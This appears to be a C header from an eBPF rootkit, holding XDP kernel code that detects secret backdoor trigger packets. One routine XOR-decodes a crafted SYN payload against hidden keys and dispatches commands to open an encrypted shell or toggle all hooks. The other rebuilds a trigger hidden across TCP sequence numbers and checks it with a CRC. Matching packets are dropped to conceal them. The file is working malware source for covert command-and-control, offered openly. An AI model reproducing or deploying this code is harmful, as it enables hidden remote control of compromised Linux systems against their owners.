#ifndef __BPF_BACKDOOR
#define __BPF_BACKDOOR

#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../data/ring_buffer.h"
#include "../../common/c&c.h"
#include "../bpf/defs.h"

static __always_inline int manage_backdoor_trigger_v1(char* payload, __u32 payload_size){
    char section[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char section3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key1[CC_TRIGGER_SYN_PACKET_SECTION_LEN]; 
    char key2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char key3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result1[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result2[CC_TRIGGER_SYN_PACKET_SECTION_LEN];
    char result3[CC_TRIGGER_SYN_PACKET_SECTION_LEN];

    //Undoing the trigger secret packet to check it is the one expected

    //Loading keys
    __builtin_memcpy(key1, CC_TRIGGER_SYN_PACKET_KEY_1, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(key2, CC_TRIGGER_SYN_PACKET_KEY_2, CC_TRIGGER_SYN_PACKET_SECTION_LEN);

    //S1 XOR K1
    __builtin_memcpy(section, payload, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result1[ii] = section[ii] ^ section2[ii];
        if(result1[ii]!=key1[ii]){
            bpf_printk("FAIL CHECK 1\n");
            return XDP_PASS;
        }
    }

    //S2 XOR K2
    __builtin_memcpy(section, payload+0x02, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result2[ii] = section[ii] ^ section2[ii];
        if(result2[ii]!=key2[ii]){
            bpf_printk("FAIL CHECK 2\n");
            return XDP_PASS;
        }
    }

    //S1 XOR K1 XOR S2 XOR K2 XOR (K3+COMMAND VALUE)
    __builtin_memcpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    __builtin_memcpy(section3, payload+0x0C, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    int correct = 1;
    int command_received = -1;

    //Checking for a valid K3, which indicates the command sent by the backdoor client
    //Not the cleanest code, needs refactoring
    //Encrypted shell request
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
        if(result3[ii]!=(key3[ii])){
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_ENCRYPTED_SHELL;
        goto backdoor_finish;
    }

    correct = 1;
    //Hook activate all request
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_ACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
        if(result3[ii]!=(key3[ii])){
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_HOOK_ACTIVATE_ALL;
        goto backdoor_finish;
    }

    correct = 1;
    //Hook deactivate all request
    __builtin_memcpy(key3, CC_TRIGGER_SYN_PACKET_KEY_3_HOOK_DEACTIVATE_ALL, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
    for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
        result3[ii] = section[ii] ^ section2[ii] ^ section3[ii];
        if(result3[ii]!=(key3[ii])){
            correct = 0;
        }
    }
    if(correct == 1){
        //Found valid k3 value
        command_received = CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL;
        goto backdoor_finish;
    }
    

backdoor_finish:
    //Found no valid key 3
    if(correct==0){
        bpf_printk("FAIL CHECK 3\n");
        return XDP_PASS;
    }

    //If we reach this point then we received trigger packet
    bpf_printk("Finished backdoor V1 check with success\n");
    int pid = -1; //Received by network stack, just ignore
    switch(command_received){
        case CC_PROT_COMMAND_ENCRYPTED_SHELL:
            bpf_printk("Received request to start encrypted connection\n");
            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
            break;
        case CC_PROT_COMMAND_HOOK_ACTIVATE_ALL:
            bpf_printk("Received request to activate all hooks\n");
            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
            break;
        case CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL:
            bpf_printk("Received request to deactivate all hooks\n");
            ring_buffer_send_backdoor_command(&rb_comm, pid, command_received);
            break;
        default:
            bpf_printk("Command received unknown: %d\n", command_received);
    }


    return XDP_DROP; 
}


static __always_inline int manage_backdoor_trigger_v3(struct backdoor_packet_log_data b_data){
    int last_received = b_data.last_packet_modified;
    int first_packet;
    if(last_received>0&&last_received<3){
        first_packet = last_received-1;
    }else{
        first_packet = (CC_STREAM_TRIGGER_PAYLOAD_LEN / CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES) -1;
    } 

    //The following routine (not just the next check) is necessarily dirty in terms of programming,
    //but the ebpf verifier strongly dislikes MOD operations (check report, screenshot)
    char payload[CC_STREAM_TRIGGER_PAYLOAD_LEN] = {0};
    if(first_packet == 1){
        for(int ii=first_packet; ii<3; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
        }
    }else if(first_packet == 2){
        for(int ii=first_packet; ii<3; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
        }
    }else if(first_packet == 3){
        for(int ii=first_packet; ii<3; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
        }
        for(int ii=0; ii<first_packet; ii++){
            __u32 seq_num = b_data.trigger_array[ii].seq_raw;
            __builtin_memcpy(payload+(CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES*ii), &(seq_num), sizeof(__u32));
        }
    }
    
    bpf_printk("Payload before XOR: ");
    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
        bpf_printk("%x", payload[ii]);
    }
    bpf_printk("\n");

    //Now that we have the possible complete stream, let's search for the secret backdoor combination in it
    //First undo running XOR
    for(int ii=CC_STREAM_TRIGGER_PAYLOAD_LEN-1; ii>0; ii--){
        char xor_res = payload[ii-1] ^ payload[ii];
        __builtin_memcpy(payload+ii, (char*)&(xor_res), 0x01);
    }

    bpf_printk("Payload after XOR: ");
    for(int ii=0; ii<CC_STREAM_TRIGGER_PAYLOAD_LEN; ii++){
        bpf_printk("%x", payload[ii]);
    }
    bpf_printk("\n");

    //Now compute CRC
    __u8 x;
    __u16 crc = 0xFFFF;
    __u8 length = 0x0A;
    char *payload_p = payload;

    while (length--){
        x = crc >> 8 ^ *payload_p++;
        x ^= x>>4;
        crc = (crc << 8) ^ ((__u16)(x << 12)) ^ ((__u16)(x <<5)) ^ ((__u16)x);
    }

    //Check CRC with the one received
    char crc_char1, crc_char2;
    __builtin_memcpy(&crc_char1, (char*)&(crc), sizeof(__u8));
    __builtin_memcpy(&crc_char2, (char*)&(crc)+1, sizeof(__u8));
    if(crc_char1 != payload[0x0A]){
        bpf_printk("Failed backdoor V3 check 1: %x vs %x\n", crc_char1, payload[0x0A]);
        return XDP_PASS;
    }
    if(crc_char2 != payload[0x0B]){
        bpf_printk("Failed backdoor V3 check 2: %x vs %x\n", crc_char2, payload[0x0B]);
        return XDP_PASS;
    }


    bpf_printk("Completed backdoor trigger v3, b_data position: %i\n", b_data.last_packet_modified);


    return XDP_DROP;
}

#endif